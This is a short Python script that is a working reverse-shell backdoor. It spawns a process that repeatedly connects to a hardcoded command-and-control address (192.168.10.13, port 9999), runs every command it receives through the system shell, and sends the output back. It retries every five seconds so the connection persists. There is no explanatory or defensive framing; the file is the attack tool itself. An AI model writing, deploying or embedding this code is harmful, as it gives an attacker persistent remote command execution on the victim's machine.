import socket
import time
import subprocess
import multiprocessing
import sys

def daemonize():
    process = multiprocessing.Process(target=connect_to_c2, daemon=False)
    process.start()
    process.join()

def connect_to_c2():
    while True:
        try:
            client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client.connect(("192.168.10.13", 9999))
            while True:
                command= client.recv(1024).decode()
                if not command:
                    break
                try:
                    result = subprocess.run(command, shell=True, capture_output=True, text=True)
                    output = result.stdout + result.stderr
                except Exception as e:
                    output = f"Error occurred: {e}"
                client.send(output.encode())
        except Exception as e:
            print(f"Connection error: {e}")
            time.sleep(5)  # Wait before retrying
        finally:
            client.close()

if __name__ == "__main__":
    daemonize()